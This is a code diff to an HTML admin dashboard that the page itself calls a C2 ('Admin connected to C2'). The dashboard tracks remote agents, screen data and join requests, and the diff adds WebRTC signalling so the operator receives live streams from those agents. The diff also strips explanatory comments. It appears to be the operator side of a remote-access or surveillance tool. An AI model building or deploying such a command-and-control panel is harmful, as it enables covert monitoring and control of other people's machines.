@@ -11,9 +11,8 @@
         .card:hover { transform: translateY(-2px); border-color: #3b82f6; }
         .btn { background: #3b82f6; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; margin-top: 10px; border-radius: 4px; }
         .btn:hover { background: #2563eb; }
-        .btn.active { background: #10b981; } /* Green for active session */
+        .btn.active { background: #10b981; }
 
-        /* Logs Container */
         #logs-container { height: 300px; overflow-y: auto; background: #000; padding: 10px; font-size: 12px; color: #ccc; border: 1px solid #334155; border-radius: 8px; }
         .log-entry { margin-bottom: 4px; border-bottom: 1px solid #1e293b; padding-bottom: 2px; }
         .log-time { color: #64748b; margin-right: 8px; }
@@ -22,7 +21,6 @@
         .log-alert-blue { color: #60a5fa; }
         .log-alert-white { color: #e2e8f0; }
 
-        /* Status Indicators */
         .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
         .status-online { background-color: #4ade80; }
         .status-offline { background-color: #94a3b8; }
@@ -51,6 +49,9 @@
         let users = {}; 
         let isConnected = false;
 
+        // WebRTC Setup for Admin
+        const peerConnections = {};
+
         ws.onopen = () => {
             console.log("Admin connected to C2");
             ws.send(JSON.stringify({ type: 'register_admin' }));
@@ -76,7 +77,7 @@
                         users[data.id].status = 'Online';
                         users[data.id].info = data;
                         users[data.id].lastSeen = Date.now();
-                        users[data.id].sessionActive = false; // Reset session on reconnect
+                        users[data.id].sessionActive = false; 
                     }
                     renderUsers();
                 }
@@ -109,10 +110,13 @@
                     }
                     users[userId].signalingData = data;
                     users[userId].lastSeen = Date.now();
+                    
+                    // Handle WebRTC Handshake
+                    handleSignaling(userId, data);
+                    
                     renderUsers();
                 }
                 else if (data.type === 'session_active') {
-                    // Mark this user as having an active session
                     if (users[data.agentId]) {
                         users[data.agentId].sessionActive = true;
                         users[data.agentId].status = 'Online';
@@ -121,7 +125,6 @@
                     }
                 }
                 else {
-                    // Generic fallback
                     if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'info' && data.type !== 'screen_data' && data.type !== 'heartbeat' && data.type !== 'system' && data.type !== 'system_log') {
                         addLog(`[${data.targetId || data.id}] Received: ${data.type}`, 'blue');
                         const userId = data.targetId || data.id;
@@ -201,7 +204,6 @@
         }
 
         function joinUser(id, status) {
-            // If we have stored signaling data, send it back to the target
             if (users[id] && users[id].signalingData) {
                 const sigData = users[id].signalingData;
                 ws.send(JSON.stringify({
@@ -212,7 +214,6 @@
                 }));
                 addLog(`[ADMIN] Resent ${sigData.type} to ${id}`, 'green');
             } else {
-                // Request a new join
                 ws.send(JSON.stringify({
                     type: 'request_join',
                     targetId: id,
@@ -221,10 +222,41 @@
                 addLog(`[ADMIN] Requested new join to ${id}`, 'blue');
             }
 
-            // Visual feedback
             const card = document.querySelector(`button[onclick="joinUser('${id}', '${status}')"]`).parentElement;
             card.style.borderColor = '#4ade80';
             setTimeout(() => card.style.borderColor = '#3b82f6', 500);
+        }
+
+        // WebRTC Logic
+        async function handleSignaling(userId, data) {
+            if (!peerConnections[userId]) {
+                peerConnections[userId] = new RTCPeerConnection();
+                peerConnections[userId].onicecandidate = event => {
+                    if (event.candidate) {
+                        ws.send(JSON.stringify({
+                            type: 'candidate',
+                            targetId: userId,
+                            candidate: event.candidate
+                        }));
+                    }
+                };
+                peerConnections[userId].ontrack = event => {
+                    addLog(`[WEBRTC] Stream received from ${userId}`, 'green');
+                };
+            }
+
+            if (data.type === 'offer') {
+                await peerConnections[userId].setRemoteDescription(new RTCSessionDescription(data.sdp));
+                const answer = await peerConnections[userId].createAnswer();
+                await peerConnections[userId].setLocalDescription(answer);
+                ws.send(JSON.stringify({
+                    type: 'answer',
+                    targetId: userId,
+                    sdp: answer
+                }));
+            } else if (data.type === 'candidate') {
+                await peerConnections[userId].addIceCandidate(new RTCIceCandidate(data.candidate));
+            }
         }
     </script>
 </body>
